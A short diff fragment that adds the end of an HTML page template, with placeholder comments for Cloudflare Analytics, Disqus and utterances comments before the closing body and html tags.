+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
